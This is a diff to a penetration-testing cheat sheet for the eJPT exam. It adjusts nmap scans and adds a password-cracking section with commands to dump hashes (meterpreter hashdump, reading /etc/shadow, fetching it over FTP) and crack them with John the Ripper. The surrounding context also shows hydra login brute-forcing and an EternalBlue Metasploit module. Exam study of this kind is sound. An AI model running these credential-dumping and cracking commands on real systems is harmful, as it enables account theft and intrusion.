@@ -10,8 +10,8 @@ This is a Cheatsheet for eJPT Exam & Course.
 ## Nmap
 ```sh
 nmap -sn 10.10.10.0/24                             #Host Discover
-nmap -sV -p- -iL 10.10.10.10 -oN nmap.initial 
-nmap -A -p- -iL 10.10.10.10 -oN nmap.aggressive 
+nmap -sV -sC 10.10.10.10                           #Best Option Scanning
+nmap -A 10.10.10.10                                #Too General Scanning
 nmap -p<port> --script=vuln 10.10.10.10            #Vulnerabillity Assessment
 ```
 ## fPing
@@ -22,7 +22,7 @@ fping -a -g 10.10.10.0/24 2>/dev/null              #Host Discover
 **Syntax**\
 ip route add \<Network-range\> via \<router-IP\> dev \<interface\>
 ```sh
-ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0
+ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0 
 
 ip route        # Checking defined routes in linux
 route           # Checking defined routes in linux
@@ -54,12 +54,7 @@ ip neighbour         #ARP Tables Linux
 netstat -ano        #Windows
 netstat -tlunp      #linux           
 ```
-## John
-```sh
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
-unshadow passwd shadow > unshadowed.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-```
+
 ## Dirbuster
 
 ![alt text](https://github.com/SattamInfosec/SattamInfosec/blob/main/Dirbuster.PNG)
@@ -133,6 +128,24 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 
 *You will know which wordlists to use when the time comes*
 
+## Password Cracking 
+
+#### To extract the Users with Hash Passwords form OS 
+```sh
+hashdump                #Windows (meterpreter)
+
+cat /etc/shadow         #Linux (Terminal) 
+
+get /etc/shadow         #Linux (FTP Server)
+```
+#### John
+```sh
+john <Hash_Password-File> --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
+
+#this is another way to crack passwords (that requires shadow file with passwd file)
+unshadow passwd shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+```
 
 ## XSS
 ```sh
@@ -244,7 +257,7 @@ exploit(windows/smb/ms17_010_psexec)> run
 **After PrivEsc**
 ```sh
 migrate </pid\>   
-hashdump          #To extract the hash Passwords and Users  
+hashdump          #To extract the Users with Hash Passwords 
 ``` 
 ## Windows Command Line
 **To search for files and Folders**
